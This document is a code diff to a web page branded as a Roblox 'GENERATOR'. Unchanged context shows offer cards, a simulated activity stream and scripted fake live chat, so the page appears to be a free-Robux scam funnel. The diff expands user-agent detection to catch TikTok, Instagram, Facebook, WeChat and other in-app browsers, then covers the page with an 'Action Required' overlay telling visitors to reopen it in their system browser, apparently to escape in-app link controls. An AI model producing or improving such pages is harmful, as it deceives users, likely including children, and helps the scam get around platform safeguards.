@@ -125,12 +125,58 @@
     .firewall-alert span { color: #ccc; font-size: 13px; line-height: 1.4; display: block; }
     .offer-card { display: flex; align-items: center; background: #252d37; border-radius: 8px; padding: 10px; margin: 0 15px 10px; text-decoration: none; color: #fff; border: 1px solid #333; transition: 0.3s; cursor: pointer; }
     .offer-btn-small { background: var(--primary); color: #000; border-radius: 6px; padding: 8px; font-size: 11px; font-weight: 800; text-align: center; min-width: 85px; }
-    .tiktok-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 99999; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; backdrop-filter: blur(10px); }
-    .tiktok-icon { font-size: 50px; color: #fff; margin-bottom: 20px; animation: bounce 1s infinite; }
-    .tiktok-title { color: #ff4757; font-size: 24px; margin-bottom: 15px; text-transform: uppercase; font-family: 'Montserrat', sans-serif; font-weight: 900; letter-spacing: 1px; }
-    .tiktok-desc { font-family: 'Inter', sans-serif; color: #ccc; font-size: 14px; line-height: 1.6; max-width: 320px; margin-bottom: 30px; }
-    .tiktok-arrow { font-size: 40px; color: var(--primary); animation: pointToMenu 1.5s infinite ease-in-out; position: absolute; top: 20px; right: 20px; transform: rotate(0deg); }
-    @keyframes pointToMenu { 0% { transform: translate(0, 0) rotate(0deg); opacity: 1; } 50% { transform: translate(0, -10px) rotate(0deg); opacity: 0.6; } 100% { transform: translate(0, 0) rotate(0deg); opacity: 1; } }
+.tiktok-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.51);
+    z-index: 99999;
+    display: none;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    padding: 20px;
+    backdrop-filter: blur(4px);
+}
+
+.tiktok-icon {
+    font-size: 50px;
+    color: #fff;
+    margin-bottom: 20px;
+    animation: bounce 1s infinite;
+}
+
+.tiktok-title {
+    color: #ff4757;
+    font-size: 24px;
+    margin-bottom: 15px;
+    text-transform: uppercase;
+    font-weight: 900;
+}
+
+.tiktok-desc {
+    color: #ccc;
+    font-size: 15px;
+    line-height: 1.6;
+    max-width: 320px;
+}
+
+.tiktok-arrow {
+    font-size: 38px;
+    color: var(--primary);
+    position: absolute;
+    top: 25px;
+    right: 25px;
+    animation: pointToMenu 1.5s infinite ease-in-out;
+}
+
+@keyframes pointToMenu {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-8px); }
+}
     .comments-container { width: 100%; background: var(--card-bg); border-radius: 16px; padding: 20px; text-align: left; border: 1px solid var(--border); margin-top: 10px; }
     .comment-header { color: #fff; font-weight: 900; margin-bottom: 15px; font-size: 16px; display: flex; justify-content: space-between; align-items: center; }
     .live-status { font-size: 10px; color: #ff4757; display: flex; align-items: center; gap: 4px; font-weight: 700; text-transform: uppercase; animation: pulseRed 2s infinite; }
@@ -164,7 +210,20 @@
     </style>
 </head>
 <body>
+<body>
 
+    <!-- TIKTOK / IN-APP BROWSER WARNING -->
+    <div id="tiktok-warning" class="tiktok-overlay">
+        <i class="fab fa-tiktok tiktok-icon"></i>
+        <div class="tiktok-arrow">⇧ ⋮</div>
+        <h2 class="tiktok-title">Action Required</h2>
+        <p class="tiktok-desc">
+            This tool works best in your full browser.<br><br>
+            Tap the <strong>three dots (⋯)</strong> in the top right → 
+            <strong style="color: var(--primary);">Open in Browser</strong>.
+        </p>
+    </div>
+   
     <div id="content-wrapper">
         <nav class="navbar">
             <div class="nav-logo"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"><span>GENERATOR</span></div>
@@ -313,41 +372,59 @@
         <span id="activityTxt" style="transition: opacity 0.5s;">Initializing activity stream...</span>
     </div>
 </div>
-</div> </div>
-
-    <!-- TIKTOK DETECTION OVERLAY -->
-    <div id="tiktok-browser-overlay" class="tiktok-overlay">
-        <div class="tiktok-icon">⚠️</div>
-        <div class="tiktok-title">TikTok Browser Detected</div>
-        <p class="tiktok-desc">TikTok's in-built browser doesn't support the full security features required for this site. To proceed, please tap the three dots or the "Open in browser" button and select <b>"Open in System Browser."</b></p>
-        <div id="tiktok-arrow" class="tiktok-arrow">⬇️</div>
-    </div>
 
 <script>
-// --- TIKTOK BROWSER DETECTION ---
-window.addEventListener('load', () => {
-    const ua = navigator.userAgent || "";
-    const overlay = document.getElementById('tiktok-browser-overlay');
+(function() {
+    const ua = navigator.userAgent.toLowerCase();
+    const overlay = document.getElementById('tiktok-warning');
     const arrow = document.getElementById('tiktok-arrow');
-    
-    // Check for TikTok/Musical.ly browsers
-    if (/TikTok|Musical\.ly/i.test(ua)) {
-        overlay.style.setProperty('display', 'flex', 'important');
-        
-        // Android = Top Right, iOS = Bottom/General
-        if (/android/i.test(ua)) {
-            arrow.style.top = "20px";
-            arrow.style.right = "20px";
-            arrow.style.transform = "rotate(-45deg)";
-        } else {
-            arrow.style.top = "auto";
-            arrow.style.bottom = "80px";
-            arrow.style.right = "20px";
-            arrow.style.transform = "rotate(180deg)";
+
+    const isInAppBrowser = 
+        /tiktok|musical_ly|bytedance|fbav|instagram|twitter|line|wechat/i.test(ua) ||
+        /; wv\)|webview/i.test(ua) ||
+        (ua.includes('android') && ua.includes('version/') && ua.includes('mobile')) ||
+        (/iphone|ipad|ipod/i.test(ua) && /applewebkit/i.test(ua) && !/version\//i.test(ua) && !/safari/i.test(ua));
+
+    if (isInAppBrowser && overlay) {
+        overlay.style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+
+        const isIOS = /iphone|ipad|ipod/i.test(ua);
+        const desc = overlay.querySelector('.tiktok-desc');
+
+        // === Arrow Positioning ===
+        if (arrow) {
+            if (isIOS) {
+                // iOS → Share button is at the bottom
+                arrow.style.top = "auto";
+                arrow.style.bottom = "85px";
+                arrow.style.right = "25px";
+                arrow.style.transform = "rotate(180deg)";   // Pointing up
+                arrow.style.fontSize = "38px";
+            } else {
+                // Android → Three dots at top right
+                arrow.style.top = "25px";
+                arrow.style.bottom = "auto";
+                arrow.style.right = "25px";
+                arrow.style.transform = "rotate(-45deg)";
+                arrow.style.fontSize = "38px";
+            }
+        }
+
+        // === Message ===
+        if (desc) {
+            if (isIOS) {
+                desc.innerHTML = `You're using an in-app browser.<br><br>
+                Tap the <strong>share button</strong> (□ with ↑) at the bottom → choose <strong>"Open in Safari"</strong>.`;
+            } else {
+                desc.innerHTML = `You're using an in-app browser.<br><br>
+                Tap the <strong>three dots ⋯</strong> (top right) → choose <strong>"Open in browser"</strong>.`;
+            }
         }
     }
-});
-
+})();
+</script>
+    <script>
 // --- MASTER STATE ---
 let isUserSearching = false; 
 let activityStarted = false;
@@ -621,4 +698,4 @@ async function startDynamicActivity() {
 window.onload = () => { fillUserQueue(); setTimeout(chatDirector, 1500); };
 </script>
 <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "f2336c17c9544a6db807c59badd85a1a"}'></script></body>
-        </html>
+</html>
